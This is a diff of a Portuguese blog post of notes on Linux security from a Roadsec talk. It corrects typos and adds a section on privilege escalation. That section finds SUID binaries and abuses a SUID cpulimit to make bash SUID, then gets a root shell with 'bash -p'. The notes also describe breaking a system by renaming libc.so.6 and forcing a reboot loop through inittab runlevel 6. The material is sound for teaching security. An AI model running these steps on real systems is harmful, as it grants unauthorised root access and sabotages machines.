@@ -1,18 +1,19 @@
 ---
-title: 'Segurança em Linux - Notes'
+title: 'Segurança em Linux — Notes'
 date: '2021-06-28'
-description: '"Usem linux... porque no linux não tem virus?"'
+lastUpdate: '2021-06-29'
+description: '"Usem linux… porque no linux não tem vírus?"'
 category: 'Linux'
 tags: 'security, roadsec, notes'
 ---
 
 # Notes
 
-> "Usem linux... porque no linux não tem virus?"
+>  "Usem linux… porque no linux não tem vírus?"
 
-Notas baseadas na live "Segurança em Linux - Christiano Linuxman | ROADSEC@HOME#37" da Roadsec, no Youtube. 
+Notas baseadas na live "Segurança em Linux — Christiano Linuxman | ROADSEC@HOME#37" da Roadsec, no YouTube. 
 
-## Indentificação de usuários
+## Identificação de usuários
 
 usuár.   | núme.
 ---------|---------
@@ -49,19 +50,19 @@ A hierarquia de permissões se da por:
 
 `umask` - **user mask** - _0 022_
 
-A `umask` influencia na pesmissão de criação de diretórios e arquivos. A `umask` é um padrão a nível de _kernel_.
+A `umask` influencia na permissão de criação de diretórios e arquivos. A `umask` é um padrão a nível de _kernel_.
 
-Toda as vezes que criarmos uma pasta/arquivo, será subtraído a nossa `umask` (022) da permição máxima (777), e o resultado será a permissão desta pasta/arquivo.
+Toda vez que criarmos uma pasta/arquivo, será subtraído a nossa `umask` (022) da permissão máxima (777), e o resultado será a permissão desta pasta/arquivo.
 
 `mkdir mateus_pasta`
 
-$$ 777 - 022 = 755 $$
+$$ 777 – 022 = 755 $$
 
 **7**_rwx_ **5**_r-x_ **5**_r-x_
 
 ![](/assets/post/seguranca-em-linux-notes/screenshot1.png)
 
-No caso do arquivo, será subtraído mais 1 bit de cada permição (111).
+No caso do arquivo, será subtraído mais 1 bit de cada permissão (111).
 
 `touch arquivo`
 
@@ -78,23 +79,23 @@ $$755 - 111 = 644$$
 
 Existem também as permissões especiais de usuário, representado pelo primeiro número da `umask` _**0**022_.
 
-permission | nº | power
+permission | n.º | power
 ---|---|---
-SUID BIT | 4 | rodar binários com o poder de usuário
+SUID BIT | 4 | rodar binários com o poder de root 
 SGID BIT | 2 | PDC
-STICK BIT | 1 | define que so quem pode deletar um arquivo é o done
+STICK BIT | 1 | define que só quem pode deletar um arquivo é o dono
 
-Imagine o cenário que precisamos que alguém execute o comando `shutdown`, porem não queremos passar a senha de _root_. Podemos dar a permição _SUID BIT_ para o binário `shutdown`:
+Imagine o cenário que precisamos que alguém execute o comando `shutdown`, porem não queremos passar a senha de _root_. Podemos dar a permissão _SUID BIT_ para o binário `shutdown`:
 
 ```
 $ chmod 4755 /sbin/shutdown
 ```
 
-Assim, qualquer usuário vai poder executar o comando `shutdown` com poder de _root_ sem precisar ser _root_.
+Assim, qualquer usuário pode executar o comando `shutdown` com poder de _root_ sem precisar ser _root_.
 
 ## O mito
 
-1. (**P.**) _Arquivos criados pelo usuário teem a permição 644._
+1. (**P.**) _Arquivos criados pelo usuário têm a permissão 644._
 2. (**P.**) _Um vírus é um binário com poder de execução._
 3. (**1**) _Um usuário não pode criar um binário naturalmente._
 4. (**2**, **3**) ∴ _Sem binários, sem vírus._
@@ -103,7 +104,7 @@ Assim, qualquer usuário vai poder executar o comando `shutdown` com poder de _r
 
 ### Libs
 
-Para cada comando no linux, precisamos de bibliotecas para funcionárem (equivalentes a DLLs do Windows). Então como eu sei as _libs_ necessárias para rodar um determinado comando? É so usar o comando `ldd`.
+Para cada comando no linux, precisamos de bibliotecas para funcionarem (equivalentes a DLLs do Windows). Então como sei as _libs_ necessárias para rodar um determinado comando? É só usar o comando `ldd`.
 
 > Ambiente Ubuntu 20.04 no [KataCoda](https://www.katacoda.com/)
 
@@ -144,15 +145,15 @@ $ ldd /bin/wget
         libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fbdc64d4000)
 ```
 
-Há uma semellhança notável entre os 3 binários, a biblioteca `libc.so.6`.
+Há uma semelhança notável entre os 3 binários, a biblioteca `libc.so.6`.
 
 ![](/assets/post/seguranca-em-linux-notes/screenshot3.png)
 
-A maioria dos comandos linux usam essa biblioteca para funcionarem. Mas, e se mudarmos o nome desse arquivo e tentarmos executar o `ls`?
+A maioria dos comandos linux usam essa biblioteca para funcionarem. Mas se mudarmos o nome desse arquivo e tentarmos executar o `ls`?
 
 ![](/assets/post/seguranca-em-linux-notes/screenshot4.png)
 
-O sistema sentou. Bem, pra resolver isso é so dar o `mv` de volta...
+O sistema sentou. Bem, para resolver isso é só dar o `mv` de volta…
 
 ![](/assets/post/seguranca-em-linux-notes/screenshot5.png)
 
@@ -160,13 +161,13 @@ O sistema sentou. Bem, pra resolver isso é so dar o `mv` de volta...
 
 No linux temos 6 tipos de _runlevel_, são eles:
 
-nº | command
+n.º | command
 ---|---
 0 | shutdown
 1 | modo de segurança
 2 | multi-usuário/sem gráfico (debian)
 3 | multi-usuário
-4 | personalisação
+4 | personalização
 5 | multi-usuário/gráfico
 6 | reboot
 
@@ -176,23 +177,23 @@ Então se eu souber qual é o primeiro processo, que é o `init` e chamar o _run
 $ init 0
 ```
 
-Nos estamos no _level_ 5, podemos conferir isso rodando o comando `runlevel`:
+Estamos no _level_ 5, podemos conferir isso rodando o comando `runlevel`:
 
 ![](/assets/post/seguranca-em-linux-notes/screenshot6.png)
 
-O N significa que não ouve nenhuma alteração de um _runlevel_ dês de a última inicialização. Nós podemos alterar esses _runlevel_, e eles estão associados a nossas pastas, se irmos ate a pasta `/etc` teremos uma pasta para cada _runlevel_:
+O N significa que não ouve nenhuma alteração de um _runlevel_ dês da última inicialização. Podemos alterar esses _runlevel_, e eles estão associados a nossas pastas, se irmos ate a pasta `/etc` teremos uma pasta para cada _runlevel_:
 
 ![](/assets/post/seguranca-em-linux-notes/screenshot7.png)
 
-Dentro da pasta `rc5.d` por exemplo, temos alguns processos que não irão subir, iniciador pela letra K (_kill_), e alguns que irão subir, iniciados pela letra S (_start_), neste determinado _runlevel_ (5).
+Na pasta `rc5.d`, por exemplo, temos alguns processos que não irão subir, iniciador pela letra K (_kill_), e alguns que irão subir, iniciados pela letra S (_start_), neste determinado _runlevel_ (5).
 
 ![](/assets/post/seguranca-em-linux-notes/screenshot8.png)
 
-Dentro do arquivo `/etc/inittab`, na segunda linha temos:
+No arquivo `/etc/inittab`, na segunda linha temos:
 ```
 id:5:initdefault
 ```
-Oque acontrceria se mudarmos esse número de 5 para 6, e desligarmos, logo após, alguem ligar o PC para navegar na internet? A sequência é:
+Oque aconteceria se mudarmos esse número de 5 para 6, e desligarmos, logo após, alguém ligar o PC para navegar na internet? A sequência é:
 
 _`id:5:initdefault`_
 - Botão Power
@@ -212,7 +213,48 @@ _`id:6:initdefault`_
 
 Caímos em um loop.
           
+## Privilege Escalation
 
+Vamos tentar fazer um ataque de _privilege escalation_ em um Linux, usando as permissões como área de exploração.
+
+Primeiro vamos pesquisar na raiz do sistema, todo arquivo que tenha a permissão 4000, com o comando `find / -perm -4000 2>/dev/null`:
+
+![](/assets/post/seguranca-em-linux-notes/screenshot9.png)
+
+Obteremos vários resultados úteis, mas o que queremos é o _cpulimit_:
+
+![](/assets/post/seguranca-em-linux-notes/screenshot10.png)
+
+O _cpulimit_ tem a permissão _SUID BIT_, ou seja, quando executa-lo ele irá trabalhar como root. Sendo assim, podemos criar uma pasta na raiz executando o comando `cpulimit -l 100 -r mkdir /pasta`, mesmo como um usuário comum:
+
+![](/assets/post/seguranca-em-linux-notes/screenshot11.png)
+
+Bem, se podemos executar um binário como root, e se usarmos isso para dar permissão _SUID BIT_ também no binário `bash`?
+
+![](/assets/post/seguranca-em-linux-notes/screenshot12.png)
+
+
+
+1. Dou permissão SUID BIT para o binário bash  
+  ```
+  ~$ cpulimit -l 100 -f chmod 4755 /usr/bin/bash
+  ```
+2. Movo o binário para minha pasta  
+  ```
+  ~$ cpulimit -l 100 -f cp /usr/bin/bash /mr_robot/
+  ```
+3. Certifico que ele tem as permissões necessárias
+  ```
+  ~$ cpulimit -l 100 -f chmod +s /mr_robot/bash
+  ```
+4. Por fim executo o binário
+  ```
+  ~$ ./bash -p
+  ```
+  ```
+  ~# id
+  uid=1001(mateus) gid=1001(mateus) euid=0(root) groups=1001(mateus)
+  ```
 
 ---
 
@@ -220,4 +262,3 @@ Caímos em um loop.
 # referências
 
 Segurança em Linux - Christiano Linuxman | ROADSEC@HOME#37: [_https://www.youtube.com/watch?v=AzB5BNDTXOk_](https://www.youtube.com/watch?v=AzB5BNDTXOk)
-
